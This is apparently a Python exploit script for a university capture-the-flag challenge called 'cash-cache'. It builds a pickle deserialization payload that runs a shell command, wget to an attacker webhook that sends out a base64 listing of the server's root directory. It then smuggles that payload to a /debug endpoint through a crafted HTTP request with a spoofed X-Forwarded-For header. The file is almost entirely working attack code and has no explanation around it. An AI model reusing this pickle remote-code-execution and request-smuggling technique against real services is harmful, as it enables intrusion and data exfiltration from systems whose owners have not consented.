import pickle
import base64
import socket
import requests as r

WEBHOOK = ""


class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system, ("wget "+WEBHOOK+"?c=$(ls${IFS}-la${IFS}/|base64${IFS}-w0)",))


data = base64.b64encode(pickle.dumps(PickleRCE()))

HOSTNAME = "cash-cache.ctf.umasscybersec.org"
PORT = 80

r1 = r.get(f"http://{HOSTNAME}:{PORT}")
UID = r1.cookies['uid']

sock = sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((HOSTNAME, PORT))

SMUGGLED_REQ = f"""POST /debug HTTP/1.1\r\nHost: localhost\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 190\r\nConnection:close\r\n\r\nuid={UID}&data={data.decode()}"""

LEN_OF_REQ = len(SMUGGLED_REQ.encode())

print(LEN_OF_REQ)
HTTP_REQ = f"""GET /test2 HTTP/1.1\r\nHost: {HOSTNAME}:{PORT}\r\nCash-Encoding: Money!\r\nContent-Length: {2+2*LEN_OF_REQ}\r\n\r\nnan{chr(9)*(LEN_OF_REQ-11)} DOLLARS\r\n{SMUGGLED_REQ}"""

sock.send(HTTP_REQ.encode())

resp = sock.recv(4096)
print(resp)

r1 = r.get(f"http://{HOSTNAME}:{PORT}", headers={
    'Cookie': f'uid={UID}'
})

print(r1.text)

print("CHECK YOUR WEBHOOK!")
